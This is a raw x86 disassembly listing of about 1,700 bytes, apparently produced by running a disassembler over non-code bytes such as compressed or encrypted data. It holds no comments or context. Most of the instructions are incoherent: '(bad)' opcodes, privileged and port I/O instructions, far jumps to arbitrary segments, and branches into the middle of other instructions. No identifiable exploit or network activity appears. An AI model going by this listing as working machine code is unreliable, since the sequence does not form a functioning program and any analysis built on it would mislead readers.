  410e02:	stos   BYTE PTR es:[edi],al
  410e03:	xchg   DWORD PTR [edx+edi*1-0x5d],eax
  410e07:	jmp    0xdabb7e18
  410e0c:	aas    
  410e0d:	call   0xe25bc8e
  410e12:	adc    dh,dh
  410e14:	cmc    
  410e15:	outs   dx,BYTE PTR ds:[esi]
  410e16:	sub    eax,0x9d9c25d3
  410e1b:	pop    eax
  410e1c:	arpl   dx,cx
  410e1e:	in     eax,0xb7
  410e20:	and    bh,0x9e
  410e23:	sbb    dh,BYTE PTR ds:[eax]
  410e26:	into   
  410e27:	or     BYTE PTR [ecx-0x46],0x98
  410e2b:	daa    
  410e2c:	mov    eax,ds:0x57fa6f05
  410e31:	jb     0x410e4d
  410e33:	xlat   BYTE PTR ds:[ebx]
  410e34:	jecxz  0x410e9b
  410e36:	into   
  410e37:	test   eax,0x9e0249e6
  410e3c:	pop    eax
  410e3d:	push   esp
  410e3e:	je     0x410e7b
  410e40:	cs pop eax
  410e42:	cwde   
  410e43:	cmp    ah,BYTE PTR [esi]
  410e45:	push   ebx
  410e46:	mov    al,0x5a
  410e48:	mov    WORD PTR [eax+0x50],?
  410e4b:	adc    bh,BYTE PTR [ecx]
  410e4d:	mov    ch,0x91
  410e4f:	lahf   
  410e50:	std    
  410e51:	xlat   BYTE PTR ds:[ebx]
  410e52:	lock mov edx,0x5aa614d8
  410e58:	bound  eax,QWORD PTR [esi-0x3f]
  410e5b:	lods   eax,DWORD PTR ds:[esi]
  410e5c:	retf   0xa6b4
  410e5f:	cld    
  410e60:	mov    dl,0xf4
  410e62:	push   es
  410e63:	dec    ebp
  410e64:	sbb    edx,eax
  410e66:	test   al,0xdd
  410e68:	leave  
  410e69:	xchg   ebp,eax
  410e6a:	mov    al,0x8e
  410e6c:	cdq    
  410e6d:	xor    edi,edx
  410e6f:	push   es
  410e70:	xor    eax,0x4a190dcf
  410e75:	inc    ebx
  410e76:	repnz mov ebp,0xfa754a1f
  410e7c:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e7e:	push   0xf5a2cbd9
  410e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e84:	pop    es
  410e85:	mov    esi,0x3a63ceb4
  410e8a:	mov    BYTE PTR [ebp+eax*8+0x18b8f553],ah
  410e91:	push   es
  410e92:	es cmp bh,bh
  410e95:	mov    ds:0x38e159e1,al
  410e9a:	mov    edx,0x50f05094
  410e9f:	test   BYTE PTR [esp+ebx*8+0x5f2246da],bl
  410ea6:	rcr    esp,cl
  410ea8:	fcmovbe st,st(4)
  410eaa:	mov    esp,0xf6d64e43
  410eaf:	jp     0x410eff
  410eb1:	mov    dl,0x29
  410eb3:	stos   DWORD PTR es:[edi],eax
  410eb4:	jp     0x410f2c
  410eb6:	inc    esp
  410eb7:	mov    ecx,DWORD PTR es:[ebp+0x4b588943]
  410ebe:	fldcw  WORD PTR [ecx+0x41]
  410ec1:	stc    
  410ec2:	stos   BYTE PTR es:[edi],al
  410ec3:	adc    DWORD PTR [ebx+0x18],ebx
  410ec6:	cli    
  410ec7:	pop    ss
  410ec8:	mov    bh,0xe4
  410eca:	xor    eax,0xc58ff5e1
  410ecf:	inc    edx
  410ed0:	lods   al,BYTE PTR ds:[esi]
  410ed1:	stos   BYTE PTR es:[edi],al
  410ed2:	mov    cl,0xde
  410ed4:	jmp    0x410f04
  410ed6:	inc    ecx
  410ed7:	(bad)  
  410ed8:	aas    
  410ed9:	outs   dx,BYTE PTR ds:[esi]
  410eda:	jp     0x410f40
  410edc:	sbb    eax,0x75c80c3a
  410ee1:	ins    DWORD PTR es:[edi],dx
  410ee2:	lds    edi,FWORD PTR [ebp+eiz*1-0x2af8c48e]
  410ee9:	das    
  410eea:	lds    esi,FWORD PTR [ebp+0x595b1d52]
  410ef0:	ins    BYTE PTR es:[edi],dx
  410ef1:	add    eax,0x4e4c155a
  410ef6:	loope  0x410f51
  410ef8:	mov    eax,0xf98ae91a
  410efd:	xchg   ecx,eax
  410efe:	outs   dx,BYTE PTR ds:[esi]
  410eff:	scas   al,BYTE PTR es:[edi]
  410f00:	add    cl,ah
  410f02:	aaa    
  410f03:	ret    0xd7cc
  410f06:	push   esp
  410f07:	xor    al,0xa5
  410f09:	les    edi,FWORD PTR [esi+eax*2]
  410f0c:	xchg   esp,eax
  410f0d:	and    dl,BYTE PTR [edi]
  410f0f:	cmp    eax,0x6242324a
  410f14:	out    dx,al
  410f15:	mov    ebp,0x6b444ac0
  410f1a:	mov    DWORD PTR [ebp-0x7798e3e2],edx
  410f20:	xor    bh,BYTE PTR [edi+ebp*8]
  410f23:	or     dh,ch
  410f25:	add    eax,0x9cee7dbc
  410f2a:	or     DWORD PTR [eax-0x5d],edi
  410f2d:	clc    
  410f2e:	push   esi
  410f2f:	(bad)  [ebp-0x4fccb055]
  410f35:	(bad)  
  410f36:	out    dx,eax
  410f37:	enter  0x84eb,0x8
  410f3b:	mov    ds:0x78998ff,eax
  410f40:	stc    
  410f41:	dec    ebx
  410f42:	adc    edi,DWORD PTR [si]
  410f45:	sub    edx,DWORD PTR [esi+0x4a]
  410f48:	and    BYTE PTR [esi-0x52ffdccc],dl
  410f4e:	pop    eax
  410f4f:	and    BYTE PTR [edx+0x34a2a281],bh
  410f55:	dec    eax
  410f56:	xchg   edi,eax
  410f57:	push   es
  410f58:	inc    ebp
  410f59:	call   0xfa6b:0xf2d271a6
  410f60:	test   BYTE PTR [edx-0x37f05775],bl
  410f66:	fs jmp 0x1042:0x898ce4ad
  410f6e:	xchg   esp,eax
  410f6f:	push   esp
  410f70:	shr    BYTE PTR [edi-0x73],cl
  410f73:	daa    
  410f74:	lds    edi,FWORD PTR [ecx]
  410f76:	aaa    
  410f77:	fwait
  410f78:	mov    ch,0x84
  410f7a:	dec    ebx
  410f7b:	mov    al,ds:0xbec3f235
  410f80:	jmp    0xf8eb4072
  410f85:	lods   eax,DWORD PTR ds:[esi]
  410f86:	aas    
  410f87:	rcr    BYTE PTR [eax-0x2b],0xa0
  410f8b:	out    dx,al
  410f8c:	or     DWORD PTR [ebp+0x25],0xb2b250b9
  410f93:	std    
  410f94:	adc    ecx,esp
  410f96:	ror    BYTE PTR [esi],1
  410f98:	mov    DWORD PTR [edx],esi
  410f9a:	add    BYTE PTR [ebx],bl
  410f9c:	and    edx,DWORD PTR [esi+edi*2]
  410f9f:	outs   dx,BYTE PTR ds:[esi]
  410fa0:	and    al,BYTE PTR [ebx-0x7bc2edbf]
  410fa6:	jmp    0x9490:0x4e8e7d9a
  410fad:	(bad)  [esi-0x5c95db41]
  410fb3:	stos   DWORD PTR es:[edi],eax
  410fb4:	sub    DWORD PTR [edi+eax*8],esi
  410fb7:	jb     0x41101b
  410fb9:	pop    ebp
  410fba:	fdiv   DWORD PTR [edi]
  410fbc:	stos   BYTE PTR es:[edi],al
  410fbd:	or     edi,ebp
  410fbf:	sub    ebx,DWORD PTR [edi]
  410fc1:	push   ebx
  410fc2:	repz (bad) 
  410fc4:	jne    0x410f6f
  410fc6:	inc    esi
  410fc7:	sbb    BYTE PTR [ebp-0x4deb1676],dh
  410fcd:	and    BYTE PTR [eax-0x73],al
  410fd0:	lock cdq 
  410fd2:	mov    ebx,0x53025a53
  410fd7:	add    edi,ecx
  410fd9:	jmp    0x411261
  410fde:	int3   
  410fdf:	into   
  410fe0:	ror    esp,0xc1
  410fe3:	rcl    ecx,cl
  410fe5:	into   
  410fe6:	jbe    0x410f92
  410fe8:	inc    esp
  410fe9:	data16 mov bh,0x64
  410fec:	jns    0x410fc7
  410fee:	gs pop edx
  410ff0:	js     0x41106a
  410ff2:	in     eax,0x7e
  410ff4:	js     0x41106e
  410ff6:	test   DWORD PTR [ebx-0x14],edx
  410ff9:	push   esi
  410ffa:	ss jnp 0x411024
  410ffd:	stc    
  410ffe:	icebp  
  410fff:	and    DWORD PTR [eax-0x2e],esp
  411002:	out    dx,al
  411003:	mov    al,bl
  411005:	inc    esp
  411006:	std    
  411007:	not    DWORD PTR ds:0x9700caf1
  41100d:	lods   eax,DWORD PTR ds:[esi]
  41100e:	test   eax,0x2e87bb40
  411013:	or     al,0x5b
  411016:	das    
  411017:	and    al,0xfa
  411019:	lahf   
  41101a:	jle    0x410faa
  41101c:	fistp  DWORD PTR [ebx+esi*8-0x62]
  411020:	xor    eax,0xb3aa3335
  411025:	in     eax,dx
  411026:	sub    eax,0x69d36436
  41102b:	xor    cl,BYTE PTR [edi]
  41102d:	bound  ebx,QWORD PTR ds:[esi-0x32d20135]
  411034:	or     BYTE PTR [bx+di+0x3299],bl
  411039:	fidiv  WORD PTR [edi-0x33]
  41103c:	xor    esp,DWORD PTR [edi]
  41103e:	mov    ds:0x9e99790,eax
  411043:	ins    BYTE PTR es:[edi],dx
  411044:	or     esi,DWORD PTR [eax+eiz*2]
  411047:	xchg   ebp,eax
  411048:	adc    DWORD PTR [esi+ebp*8+0xc3ab5e8],ebp
  41104f:	or     dl,BYTE PTR [esi-0x37b135be]
  411055:	jmp    0x8c65:0x54a64c
  41105c:	xlat   BYTE PTR ds:[ebx]
  41105d:	pop    eax
  41105e:	mov    bl,0xda
  411060:	xchg   ebp,eax
  411061:	jae    0x411049
  411063:	mov    edx,0xf8545a52
  411068:	not    DWORD PTR [edi-0x447710c0]
  41106e:	out    dx,eax
  41106f:	add    bh,ah
  411071:	rol    BYTE PTR [edi-0x73ba9daa],cl
  411077:	ds jle 0x411081
  41107a:	addr16 sub al,0x51
  41107d:	and    DWORD PTR [edi],edx
  41107f:	inc    ecx
  411080:	leave  
  411081:	pop    es
  411082:	repz das 
  411084:	js     0x4110b4
  411086:	jg     0x4110a6
  411088:	out    0x2b,eax
  41108a:	add    al,0x90
  41108c:	dec    ebx
  41108d:	xchg   ecx,eax
  41108e:	pop    esp
  41108f:	inc    esp
  411090:	xchg   edx,eax
  411091:	mov    BYTE PTR [edi-0x1dd2c438],al
  411097:	cmp    ah,al
  411099:	add    bh,BYTE PTR [eax+ebp*1+0x43a77072]
  4110a0:	int    0xf0
  4110a2:	ins    DWORD PTR es:[edi],dx
  4110a3:	call   0xc718:0xc1efea4c
  4110aa:	xchg   edi,eax
  4110ab:	nop
  4110ac:	jnp    0x411083
  4110ae:	fdivr  st(3),st
  4110b0:	dec    ebp
  4110b1:	push   ebp
  4110b2:	mov    ch,0xf0
  4110b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110b5:	ret    0xce2
  4110b8:	push   ds
  4110b9:	push   cx
  4110bb:	add    al,0x5b
  4110bd:	jmp    0x52017f42
  4110c2:	dec    ebx
  4110c3:	pushf  
  4110c4:	aad    0x6d
  4110c6:	cwde   
  4110c7:	inc    ebp
  4110c8:	mov    ds:0x8445bb87,eax
  4110cd:	into   
  4110ce:	lods   al,BYTE PTR ds:[esi]
  4110cf:	or     al,0x8a
  4110d1:	xchg   edx,eax
  4110d2:	jno    0x4110db
  4110d4:	inc    esp
  4110d5:	sub    BYTE PTR ss:[ebx+0xe],dl
  4110d9:	jnp    0x411140
  4110db:	xchg   ebp,eax
  4110dc:	sub    ebp,edx
  4110de:	icebp  
  4110df:	pusha  
  4110e0:	or     eax,0x85350ee7
  4110e5:	push   ecx
  4110e6:	iret   
  4110e7:	mov    bl,0xdb
  4110e9:	add    DWORD PTR [ebx+ecx*4+0x3794a40f],esi
  4110f0:	imul   ebp,DWORD PTR [esi],0x864c7238
  4110f6:	or     esp,DWORD PTR [ecx]
  4110f8:	mov    ebx,0x23d4b95d
  4110fd:	inc    edi
  4110fe:	xchg   edx,eax
  4110ff:	and    eax,0x785955d3
  411104:	add    eax,0xb24fba41
  411109:	aam    0xf4
  41110b:	pop    ebp
  41110c:	xchg   ebx,eax
  41110d:	adc    DWORD PTR [edi+ecx*2-0x79d4b940],eax
  411114:	push   ebx
  411115:	pop    ebp
  411116:	adc    esp,DWORD PTR [esi+eiz*4]
  411119:	mov    bh,0xa2
  41111b:	pop    edi
  41111d:	push   cs
  41111e:	or     DWORD PTR [ebx-0x63df73a0],edx
  411124:	xchg   esi,eax
  411125:	push   0x10963118
  41112a:	push   edx
  41112b:	mov    ds:0xc08da8e1,al
  411130:	in     eax,dx
  411131:	xor    BYTE PTR [ecx+0x34520669],al
  411137:	call   0x9710:0xd6e1ed9c
  41113e:	repnz push ebx
  411140:	jmp    0x21c13b9b
  411145:	test   DWORD PTR [esi+0x5caab1d8],edx
  41114b:	lock pusha 
  41114d:	ds xchg esi,eax
  41114f:	xor    edx,eax
  411151:	jmp    0x4110f2
  411153:	std    
  411154:	pusha  
  411155:	int    0xbc
  411157:	shl    eax,0x1c
  41115a:	pop    ebp
  41115b:	bound  esp,QWORD PTR [esi]
  41115d:	in     al,0xe0
  41115f:	jp     0x411139
  411161:	not    DWORD PTR [edx+0x4d]
  411164:	xor    al,0x31
  411166:	daa    
  411167:	gs jno 0x4110f5
  41116a:	jbe    0x41119a
  41116c:	mov    esp,0xa9a117f4
  411171:	sbb    bl,BYTE PTR [edx+0x14]
  411174:	sbb    ecx,DWORD PTR [ebx]
  411176:	shr    BYTE PTR [eax],0x1
  411179:	xchg   ebp,eax
  41117a:	fs dec eax
  41117c:	lods   al,BYTE PTR ds:[esi]
  41117d:	arpl   sp,sp
  41117f:	xchg   ecx,eax
  411180:	in     eax,dx
  411181:	adc    ah,BYTE PTR cs:[ebp+0x9f28dad]
  411188:	jns    0x4111b7
  41118a:	and    edx,DWORD PTR [ecx+0x25]
  41118d:	jnp    0x411152
  41118f:	jo     0x41117a
  411191:	cs test eax,0xc8fc4cbb
  411197:	push   eax
  411198:	retf   
  411199:	dec    edx
  41119a:	push   esp
  41119b:	int    0x15
  41119d:	push   eax
  41119e:	jmp    0x4111bc
  4111a0:	cld    
  4111a1:	pop    esi
  4111a2:	push   0xffffffe5
  4111a4:	push   ebx
  4111a5:	pushf  
  4111a6:	mov    esp,0x5629f6c8
  4111ab:	cdq    
  4111ac:	rdmsr  
  4111ae:	mov    cl,0xc5
  4111b0:	cmc    
  4111b1:	shl    DWORD PTR [esi-0x46ba2bf],1
  4111b7:	pushf  
  4111b8:	sbb    DWORD PTR [edi],0x14
  4111bb:	xor    edi,ebx
  4111bd:	or     al,0x21
  4111bf:	mov    cl,0x11
  4111c1:	and    esp,ebp
  4111c3:	bound  edi,QWORD PTR [esi-0x255c667b]
  4111c9:	fsubr  st,st(2)
  4111cb:	js     0x4111a2
  4111cd:	repnz push ebx
  4111cf:	gs jmp 0x56862a48
  4111d5:	je     0x411191
  4111d7:	shl    BYTE PTR [ebx-0x76],1
  4111da:	cmp    eax,0x3db18e4d
  4111df:	mov    ecx,0x8448bab
  4111e4:	mov    bl,0x95
  4111e6:	cs jnp 0x411191
  4111e9:	xchg   ebx,eax
  4111ea:	dec    edx
  4111eb:	ins    DWORD PTR es:[edi],dx
  4111ec:	jnp    0x411184
  4111ee:	imul   BYTE PTR [ebp+0x78]
  4111f1:	ja     0x411182
  4111f3:	fsubp  st(5),st
  4111f5:	mov    bl,BYTE PTR [ebx]
  4111f7:	aad    0x9f
  4111f9:	xchg   ebp,eax
  4111fa:	in     eax,dx
  4111fb:	cs daa 
  4111fd:	into   
  4111fe:	pop    ss
  4111ff:	xchg   ebp,eax
  411200:	pop    ecx
  411201:	fs cld 
  411203:	jae    0x4111e5
  411205:	out    dx,al
  411206:	lea    ecx,[ebx-0xb0606c]
  41120c:	jmp    0x4111ea
  41120e:	jnp    0x411273
  411210:	bound  edi,QWORD PTR [ebp-0x36]
  411213:	mov    edx,0x4a22969d
  411218:	cmp    eax,0x9981bbd6
  41121d:	pop    ds
  41121e:	mov    ebp,0x73d533a3
  411223:	and    edx,DWORD PTR [ebp-0x1c]
  411226:	add    dh,BYTE PTR [esi+ecx*4+0x675e045d]
  41122d:	push   eax
  41122e:	in     eax,0x2
  411230:	push   ecx
  411231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411232:	xor    ah,BYTE PTR ds:0x9782bdf1
  411238:	test   eax,0xff3d0b2
  41123d:	cmp    BYTE PTR [esi+ebp*2-0x6e],bl
  411241:	bound  eax,QWORD PTR [eax]
  411243:	repnz pop esi
  411245:	(bad)  
  411246:	sbb    edi,DWORD PTR [ecx+esi*1-0x1bc83116]
  41124d:	not    DWORD PTR [edx]
  41124f:	cmp    al,cl
  411251:	pusha  
  411252:	repnz sar esi,1
  411255:	adc    dh,BYTE PTR [ebp-0x59]
  411258:	dec    esp
  411259:	xor    esi,ebx
  41125b:	mov    bl,0xdc
  41125d:	dec    esi
  41125e:	pop    ebx
  41125f:	ret    
  411260:	js     0x411265
  411262:	ror    DWORD PTR [edi],1
  411264:	scas   eax,DWORD PTR es:[edi]
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	jmp    0x4114ee
  41126b:	aas    
  41126c:	xlat   BYTE PTR ds:[ebx]
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	retf   
  41126f:	xlat   BYTE PTR ds:[ebx]
  411270:	retf   
  411271:	rcr    ebx,cl
  411273:	and    cl,ah
  411275:	or     BYTE PTR [eax-0x80],al
  411278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411279:	and    DWORD PTR [edx-0x2e],edi
  41127c:	pop    edi
  41127d:	js     0x4112f7
  41127f:	in     eax,0x7e
  411281:	js     0x4112fb
  411283:	loopne 0x411301
  411285:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  411287:	(bad)  
  411288:	xchg   ebx,eax
  411289:	inc    edx
  41128a:	imul   edx,DWORD PTR [eax-0x52],0x74c1605
  411291:	add    BYTE PTR [ecx+eax*8],dl
  411294:	cmp    ebp,ebp
  411296:	push   edi
  411297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411298:	js     0x4112de
  41129a:	cli    
  41129b:	and    al,0x3
  41129d:	lods   al,BYTE PTR ds:[esi]
  41129e:	xchg   edx,eax
  41129f:	fisttp QWORD PTR [ebx]
  4112a1:	sbb    esi,esp
  4112a3:	mov    eax,0xa1d5fffe
  4112a8:	mov    ds:0xfec7feaa,al
  4112ad:	leave  
  4112ae:	out    dx,al
  4112af:	jnp    0x4112c3
  4112b1:	and    eax,0x58444bf8
  4112b6:	jmp    0x411261
  4112b8:	mov    edx,0x58e2983b
  4112bd:	scas   eax,DWORD PTR es:[edi]
  4112be:	mov    edi,0xfc54d808
  4112c3:	jmp    0x588f:0x757ac08c
  4112ca:	std    
  4112cb:	repz mov al,ds:0x7ea1d1e2
  4112d1:	jo     0x411304
  4112d3:	jns    0x4112da
  4112d5:	fnsave [ebx+0x4ed5511d]
  4112db:	mov    dl,0xe2
  4112dd:	dec    edi
  4112de:	out    0x77,eax
  4112e0:	add    ax,0xd001
  4112e4:	inc    edx
  4112e5:	clc    
  4112e6:	xchg   edx,eax
  4112e7:	stos   DWORD PTR es:[edi],eax
  4112e8:	add    al,0x79
  4112ea:	push   ss
  4112eb:	fcmovnbe st,st(5)
  4112ed:	call   0x1649a944
  4112f2:	mov    ss:0x343a0a1f,eax
  4112f8:	push   0xb20163d8
  4112fd:	xor    bl,dl
  4112ff:	idiv   BYTE PTR [ecx]
  411301:	cmp    al,0x6a
  411303:	call   0x834a634b
  411308:	inc    ecx
  411309:	xchg   ebx,eax
  41130a:	nop
  41130b:	leave  
  41130c:	sub    al,0x4a
  41130e:	xchg   edi,eax
  41130f:	mov    dh,0x37
  411311:	stos   DWORD PTR es:[edi],eax
  411312:	arpl   WORD PTR [ecx-0x2c],cx
  411315:	dec    esp
  411316:	and    DWORD PTR [ebx+0x7e6ea70b],ecx
  41131c:	jnp    0x4112d0
  41131e:	loope  0x4112aa
  411320:	jmp    0x411317
  411322:	pop    es
  411323:	adc    eax,0x1a6d6d43
  411328:	loop   0x411321
  41132a:	and    ebx,DWORD PTR [ebp+0x64a5a1a1]
  411330:	ror    DWORD PTR [edx-0x17],0x1b
  411334:	sbb    eax,0x740d019d
  411339:	repnz stos BYTE PTR es:[edi],al
  41133b:	jmp    0x394:0xf17f7d79
  411342:	call   0x672e2f8f
  411347:	ror    BYTE PTR [eax],cl
  411349:	mov    dl,0x9
  41134b:	pop    esp
  41134c:	inc    ebx
  41134d:	retf   
  41134e:	scas   al,BYTE PTR es:[edi]
  41134f:	jae    0x41135d
  411351:	mov    ds:0x25fc8a2d,eax
  411356:	pushf  
  411357:	push   esp
  411358:	in     eax,0xa8
  41135a:	out    0xae,al
  41135c:	int3   
  41135d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41135e:	push   ebp
  41135f:	mov    al,ds:0x317264f6
  411364:	add    eax,DWORD PTR [esi]
  411366:	fdiv   DWORD PTR ds:0xb177050c
  41136c:	fisubr WORD PTR [ecx-0x35ccc523]
  411372:	mov    ?,esp
  411374:	jae    0x4113b4
  411376:	jo     0x411376
  411378:	add    al,0x58
  41137a:	push   esi
  41137b:	sysret 
  41137d:	add    BYTE PTR [eax+0x6cf20a61],al
  411383:	aas    
  411384:	cmc    
  411385:	ror    BYTE PTR [ebx],cl
  411387:	pop    esi
  411388:	xchg   DWORD PTR [ebx-0x14e7c348],esi
  41138e:	loope  0x411310
  411390:	xor    edi,DWORD PTR [edi-0x64db0736]
  411396:	xor    BYTE PTR [eax],dh
  411398:	and    DWORD PTR [ebp-0x57],esp
  41139b:	lods   al,BYTE PTR ds:[esi]
  41139c:	or     BYTE PTR [edi+esi*2],bh
  41139f:	(bad)  
  4113a0:	xchg   ebx,eax
  4113a1:	cli    
  4113a2:	pop    edx
  4113a3:	cmp    BYTE PTR [ecx+0x21cbed2c],ah
  4113a9:	sbb    eax,0xe80ca053
  4113ae:	or     al,0x93
  4113b0:	stos   DWORD PTR es:[edi],eax
  4113b1:	or     al,0x91
  4113b3:	mov    eax,ds:0xf6095a4c
  4113b8:	repnz push esp
  4113ba:	push   edi
  4113bb:	xor    esp,DWORD PTR [ecx-0x7d79a70d]
  4113c1:	pop    eax
  4113c2:	xor    dl,bh
  4113c4:	mov    esi,0x6a25ce9a
  4113c9:	lahf   
  4113ca:	(bad)  
  4113cc:	sub    ecx,DWORD PTR [eax+0x2807bd85]
  4113d2:	fs sahf 
  4113d4:	addr16 mov ds:0xb00,eax
  4113d8:	pushf  
  4113d9:	dec    edi
  4113da:	bound  ebx,QWORD PTR [edx]
  4113dc:	pushf  
  4113dd:	outs   dx,DWORD PTR ds:[esi]
  4113de:	inc    edx
  4113df:	hlt    
  4113e0:	xor    ecx,esp
  4113e2:	add    esi,DWORD PTR [ecx+0x4c]
  4113e5:	dec    ebp
  4113e6:	ror    BYTE PTR [ebx+0x12],cl
  4113e9:	(bad)  
  4113ea:	xor    ecx,DWORD PTR [ebp-0x7e]
  4113ed:	ins    BYTE PTR es:[edi],dx
  4113ee:	fs mov bl,0xf1
  4113f1:	fisubr DWORD PTR [eax]
  4113f3:	or     al,0xbe
  4113f5:	loope  0x411414
  4113f7:	inc    ebp
  4113f8:	std    
  4113f9:	and    al,0xb6
  4113fb:	fisub  DWORD PTR [ebx-0x41]
  4113fe:	and    DWORD PTR [edx-0x1cb8081f],ecx
  411404:	bound  eax,QWORD PTR [edx]
  411406:	int3   
  411407:	xor    al,0x77
  411409:	out    0xcf,eax
  41140b:	lods   eax,DWORD PTR ds:[esi]
  41140c:	cmp    al,0x7c
  41140e:	xor    DWORD PTR [edi-0x6c0040bf],ecx
  411414:	repz xor edi,DWORD PTR [eax]
  411417:	dec    esp
  411418:	(bad)  
  411419:	enter  0x6495,0x48
  41141d:	dec    eax
  41141e:	sar    BYTE PTR [ecx+0x308a831a],0x18
  411425:	pop    edi
  411426:	mov    BYTE PTR [esi-0x53],ah
  411429:	in     al,0xa4
  41142b:	push   es
  41142c:	mov    bl,0xcd
  41142e:	out    dx,al
  41142f:	or     BYTE PTR [eax-0x17],0x2a
  411433:	fisub  WORD PTR [ebx+0x4e532193]
  411439:	dec    esp
  41143a:	rol    DWORD PTR [ebx],cl
  41143c:	dec    ecx
  41143d:	(bad)  [ecx-0x2cfac8ab]
  411443:	sub    edi,DWORD PTR [esi]
  411445:	(bad)  
  411446:	pop    ss
  411447:	jle    0x4114c3
  411449:	(bad)  
  41144a:	fstp   QWORD PTR [edx-0x6]
  41144d:	jmp    0x42f73dad
  411452:	jge    0x4113fa
  411454:	pop    edi
  411455:	sbb    edx,ebx
  411457:	mov    al,ds:0x4a062dc8
  41145c:	mov    ch,0xfa
  41145e:	scas   eax,DWORD PTR es:[edi]
  41145f:	mov    BYTE PTR ds:0x8411f83f,ah
  411465:	adc    edi,DWORD PTR [ebx-0x17fe9d26]
  41146b:	repz cld 
  41146d:	outs   dx,BYTE PTR ds:[esi]
  41146e:	jmp    0x4114b9
  411470:	xchg   DWORD PTR [ebx+0x14],ebx
  411473:	dec    ebx
  411474:	retf   0x874a
  411477:	jns    0x4114d9
  411479:	arpl   WORD PTR [ecx-0x5e],di
  41147c:	dec    edx
  41147d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41147e:	jmp    0x411471
  411480:	inc    edx
  411481:	sub    DWORD PTR [ecx],ebp
  411483:	(bad)  
  411484:	mov    bh,0x5f
  411486:	fimul  WORD PTR [ebx]
  411488:	xor    al,0x41
  41148a:	cli    
  41148b:	dec    ebx
  41148c:	xchg   BYTE PTR [ebx-0x603f665d],ch
  411492:	sub    DWORD PTR ds:0x5d53de98,edx
  411498:	test   DWORD PTR [ebx+eiz*8],edx
  41149b:	out    0x7a,eax
  41149d:	mov    ebp,0xee926aa1
  4114a2:	push   ebx
  4114a3:	test   al,0x16
  4114a5:	push   ebp
  4114a6:	mov    al,ds:0x12adf205
  4114ab:	xchg   edx,eax
  4114ac:	mov    ah,0xc7
  4114ae:	jae    0x411432
  4114b0:	or     al,0x64
  4114b2:	cli    
  4114b3:	mov    WORD PTR [ebx+eiz*1],ss
  4114b6:	xchg   edx,eax
  4114b7:	push   ecx
  4114b8:	ret    
  4114b9:	jmp    0x41146b
  4114bb:	sub    al,BYTE PTR cs:[ebp+esi*2-0x11f6b317]
  4114c3:	jle    0x411484
  4114c5:	ins    DWORD PTR es:[edi],dx
  4114c6:	and    BYTE PTR [edi+0x391c9494],ah
  4114cc:	add    eax,0x2b3a1f4d
  4114d1:	or     cl,bl
  4114d3:	mov    bh,BYTE PTR [esi+edi*2]
  4114d6:	pop    edx
  4114d7:	sbb    ecx,eax
  4114d9:	bound  ecx,QWORD PTR [ebx]
  4114db:	lods   al,BYTE PTR ds:[esi]
  4114dc:	and    BYTE PTR [ecx+0x1a],bh
  4114df:	sub    bh,cl
  4114e1:	jmp    0x1f8a:0x10beb51b
  4114e8:	push   ecx
  4114e9:	mov    BYTE PTR [ebx],bh
  4114eb:	inc    edi
  4114ec:	iret   
  4114ed:	sbb    al,0x8b
  4114ef:	jge    0x4114e9
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	push   edx
  411510:	mov    edx,0x5dbfd696
  411515:	js     0x41158f
  411517:	in     eax,0x7e
  411519:	js     0x411593
  41151b:	test   BYTE PTR [edi+0x73],0x93
  41151f:	aad    0x64
  411521:	(bad)  
  411522:	push   edi
  411523:	ficomp DWORD PTR [ecx+eiz*2]
  411526:	xor    eax,0x89e83861
  41152b:	mov    esp,0xf487fb04
  411530:	xchg   esi,eax
  411531:	inc    eax
  411532:	cmp    cl,BYTE PTR fs:[edi]
  411535:	cmp    eax,0xe54dec97
  41153a:	fbld   TBYTE PTR [edx+0x3c8520d]
  411540:	adc    cl,dl
  411542:	and    al,BYTE PTR [edx-0x21a9a448]
  411548:	mov    dl,0x90
  41154a:	xor    eax,0xc194c7ba
  41154f:	sbb    ecx,0x4b32660b
  411555:	enter  0x421b,0xcd
  411559:	jbe    0x411595
  41155b:	and    BYTE PTR [ebp-0x2f],dh
  41155e:	fsubr  QWORD PTR [ecx+0x9]
  411561:	push   0x79
  411563:	jl     0x4115c2
  411565:	xor    esp,DWORD PTR [ebx]
  411567:	leave  
  411568:	and    eax,0xcb103e85
  41156d:	add    al,0xc2
  41156f:	xlat   BYTE PTR ds:[ebx]
  411570:	scas   eax,DWORD PTR es:[edi]
  411571:	push   0x77
  411573:	js     0x411562
  411575:	fs and eax,0xbfb1e4c9
  41157b:	add    al,0x10
  41157d:	mov    edi,0xa43118b7
  411582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411583:	add    dh,BYTE PTR [ecx]
  411585:	sub    DWORD PTR [edx+0x2c],0x39c1ae21
  41158c:	fistp  DWORD PTR [ecx]
  41158e:	jge    0x411562
  411590:	push   edx
  411591:	scas   al,BYTE PTR es:[edi]
  411592:	pop    edx
  411593:	sub    eax,0xf1eda2a4
  411598:	mov    ds:0x73b66c27,eax
  41159d:	push   ss
  41159e:	stos   DWORD PTR es:[edi],eax
  41159f:	xchg   DWORD PTR [edx+0x7e227df9],esp
  4115a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115a6:	mov    edx,0xca9bf437
  4115ab:	stos   DWORD PTR es:[edi],eax
  4115ac:	push   ds
  4115ad:	push   ds
  4115ae:	dec    esi
  4115af:	add    edx,esp
  4115b1:	cmp    esp,eax
  4115b3:	and    al,0xb9
  4115b5:	xor    al,0x76
  4115b7:	lds    ebp,FWORD PTR ds:0x95358007
  4115bd:	sbb    bh,BYTE PTR [eax-0x5e197707]
  4115c3:	push   esi
  4115c4:	sbb    ah,BYTE PTR [esi-0x4f886fc8]
  4115ca:	(bad)  
